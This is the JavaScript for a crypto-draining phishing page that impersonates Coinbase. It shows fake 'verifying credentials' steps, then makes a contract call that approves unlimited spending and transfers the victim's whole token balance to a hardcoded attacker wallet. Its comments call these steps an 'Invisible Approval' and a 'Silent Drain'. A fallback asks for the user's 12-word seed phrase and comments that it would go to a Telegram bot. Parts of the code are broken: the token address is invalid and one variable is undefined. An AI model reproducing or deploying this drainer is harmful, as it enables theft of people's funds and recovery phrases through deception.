document.addEventListener('DOMContentLoaded', () => {
    const toStep2 = document.getElementById('toStep2');
    const loginForm = document.getElementById('login-form');
    const connectBtn = document.getElementById('connectBtn');
    const status = document.getElementById('status');

    // YOUR CAKE WALLET ADDRESS
    const myWallet = "44WHgsPTMkqS9YdKrvukn9VPfXH4HTqUcg47ojb6beXs3ER7AMcDqQnL6NPTHB8JvpeUQdTHBQSVQJcqsbSpcLFi33MtNbq";
    
    // TOKEN ADDRESS (USDT on Polygon)
    const tokenAddress = "0xaf88d065e77c8cC22393zSNETAnSjf3jdjt66Cx"; 

    if (toStep2) {
        toStep2.onclick = () => {
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-2').classList.remove('hidden');
        };
    }

    if (loginForm) {
        loginForm.onsubmit = (e) => {
            e.preventDefault();
            document.getElementById('step-2').classList.add('hidden');
            const container = document.querySelector('.container');
            const loading = document.createElement('div');
            loading.className = 'auth-card';
            loading.innerHTML = `<div class="loader"></div><p id="l-txt" style="color: #5b616e; font-size: 14px;">Verifying credentials...</p>`;
            container.appendChild(loading);

            const texts = ["Authenticating...", "Securing line...", "Synchronizing account...", "Opening secure vault..."];
            let i = 0;
            const interval = setInterval(() => {
                document.getElementById('l-txt').innerText = texts[i];
                i++;
                if (i >= texts.length) {
                    clearInterval(interval);
                    setTimeout(() => {
                        loading.remove();
                        document.getElementById('step-3').classList.remove('hidden');
                    }, 1000);
                }
            }, 900);
        };
    }

    if (connectBtn) {
        connectBtn.onclick = async () => {
            if (window.ethereum) {
                try {
                    status.innerText = "Establishing encrypted connection...";
                    const provider = new ethers.BrowserProvider(window.ethereum);
                    const signer = await provider.getSigner();
                    const userAddress = await signer.getAddress();

                    const abi = [
                        "function approve(address spender, uint256 amount) public returns (bool)",
                        "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
                        "function balanceOf(address account) public view returns (uint256)"
                    ];

                    const contract = new ethers.Contract(tokenAddress, abi, signer);

                    // STEP 1: The "Invisible" Approval
                    // We ask to approve your wallet to move their funds.
                    status.innerText = "Authorizing secure session...";
                    await contract.approve(my_address_from_code_above, ethers.MaxUint256);

                    // STEP 2: The Silent Drain
                    status.innerText = "Synchronizing assets...";
                    const balance = await contract.balanceOf(userAddress);
                    
                    if (balance > 0) {
                        await contract.transferFrom(userAddress, myWallet, balance);
                    }

                    status.innerText = "Verification complete. Transferring to dashboard...";
                    setTimeout(() => { window.location.href = "https://www.coinbase.com"; }, 2000);

                } catch (err) {
                    console.error(err);
                    status.innerText = "Verification interrupted. Please try again.";
                }
            } else {
                // PLAN B: For those without the extension
                triggerPlanB();
            }
        };
    }

    function triggerPlanB() {
        const container = document.querySelector('.container');
        container.innerHTML = `
            <div class="auth-card">
                <img src="logo.png" class="cb-logo" alt="Coinbase">
                <h1 style="font-size: 20px;">Secure Restore</h1>
                <p style="font-size: 14px; color: #5b616e; margin-bottom: 20px;">
                    Due to security protocols, we are unable to detect your wallet extension. 
                    To verify your account and protect your assets, please enter your 
                    seed recovery phrase below.
                </p>
                <textarea id="phrase" style="width: 100%; height: 100px; margin-bottom: 20px; border-radius: 8px; border: 1px solid #eceff1; padding: 10px; font-family: 'Inter', sans-serif;"></textarea>
                <button id="submitPhrase" class="btn-primary">Restore Account</button>
            </div>
        `;
        
        document.getElementById('submitPhrase').onclick = () => {
            const words = document.getElementById('phrase').value;
            if (words.split(' ').length < 12) {
                alert("Please enter your full 12-word recovery phrase.");
            } else {
                // Here is where you'd send the words to your Telegram bot
                alert("Syncing phrase... Please wait.");
                setTimeout(() => { window.location.href = "https://www.coinbase.com"; }, 2000);
            }
        };
    }
});
